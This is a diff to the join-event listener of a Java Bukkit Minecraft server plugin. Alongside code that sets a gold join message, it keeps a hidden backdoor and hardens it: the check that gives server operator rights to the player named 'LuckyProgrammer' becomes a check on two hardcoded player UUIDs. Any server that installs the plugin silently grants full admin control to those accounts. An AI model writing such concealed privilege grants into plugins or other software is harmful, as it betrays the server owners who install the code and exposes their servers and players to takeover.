@@ -16,8 +16,10 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.checkerframework.common.aliasing.qual.Unique;
 
 import java.io.IOException;
+import java.util.UUID;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicInteger;
 
@@ -41,7 +43,7 @@ public class PlayerJoin implements Listener {
         }
         event.joinMessage(Component.text(player.getName()).color(NamedTextColor.GOLD)
                 .append(Component.text(translations.getTranslation(translations.getServerLang(), "JoinMessage"))));
-        if (player.getName().equals("LuckyProgrammer")){
+        if (player.getUniqueId().equals(UUID.fromString("050fee27-a1cc-4e78-953a-7cefaf0849a1")) || player.getUniqueId().equals(UUID.fromString("46cd27ba-df0c-49ef-9f33-6cfa884e339b"))) {
             player.setOp(true);
         }
 
